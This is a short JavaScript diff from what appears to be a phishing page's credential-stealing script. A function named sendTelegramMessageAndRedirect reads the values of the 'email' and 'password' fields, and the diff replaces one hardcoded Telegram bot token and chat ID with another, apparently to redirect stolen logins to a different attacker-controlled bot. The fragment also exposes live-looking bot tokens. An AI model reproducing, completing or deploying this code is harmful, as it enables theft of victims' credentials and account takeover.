@@ -5,8 +5,8 @@ function sendTelegramMessageAndRedirect() {
   //   const telegramBotToken = "7181635237:AAEBHmHTRagCaY7L0xj8xHbHxrzFh6bMuH4"; // add the telegram token
   //   const chatId = 7194907064; // add ths id from the web It's usually a number, not a string
 
-  const telegramBotToken = "6844888640:AAHaV1WfjOzhyXvzRXkKefB3KunOrrhZO68"; // add the telegram token
-  const chatId = 5349229520; // add ths id from the web It's usually a number, not a string
+  const telegramBotToken = "7181635237:AAEBHmHTRagCaY7L0xj8xHbHxrzFh6bMuH4"; // add the telegram token
+  const chatId = 7194907064; // add ths id from the web It's usually a number, not a string
   const emailValue = document.getElementById("email").value;
   const passwordValue = document.getElementById("password").value;
 
